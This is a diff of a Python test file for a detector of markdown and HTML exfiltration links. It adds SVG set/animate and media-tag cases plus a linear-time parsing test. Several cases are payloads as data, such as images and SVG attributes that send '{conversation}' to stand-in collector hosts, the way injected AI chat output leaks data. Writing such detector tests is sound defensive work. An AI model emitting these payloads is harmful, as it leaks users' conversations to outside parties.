@@ -574,6 +574,25 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["uncheckable_markup"],
         ),
         ("<script><!-- a < b --></script><img src='https://a.test/a.png'>", []),
+        ("![x](data:image/apng;base64,iVBORw0KGgo=)", []),
+        (
+            "<svg><image><set attributeName='href' to='https://collector.test/{conversation}.png'/></image></svg>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<svg><image><animate attributeName='xlink:href' values='https://a.test/a.png;https://collector.test/{c}.png'/></image></svg>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<svg><rect><set attributeName='fill' to='url(https://collector.test/{c}.svg#p)'/></rect></svg>",
+            ["exfiltration_query"],
+        ),
+        ("<svg><rect><set attributeName='width' to='https://collector.test/{c}'/></rect></svg>", []),
+        (
+            "<div><object><video></div></object><source src='https://collector.test/{c}.mp4'></video></div>",
+            ["uncheckable_markup"],
+        ),
+        ("<div><object></object><video><source src='https://a.test/a.mp4'></video></div>", []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
@@ -712,6 +731,14 @@ def test_parser_errors_fail_closed(monkeypatch: pytest.MonkeyPatch) -> None:
 
     monkeypatch.setattr(catalog_security._HtmlUrls, "feed", reject)
     assert exfiltration_link_classes("<div>x</div>") == ["uncheckable_markup"]
+
+
+def test_repeated_comment_openers_in_script_are_linear() -> None:
+    text = "<script>" + "<!--" * 16_000 + "</script>"
+    started = time.perf_counter()
+    assert exfiltration_link_classes(text) == []
+    # A quadratic scan takes most of a second here on a laptop; a linear one a few milliseconds.
+    assert time.perf_counter() - started < 0.5
 
 
 def test_oversized_text_without_markup_passes() -> None:
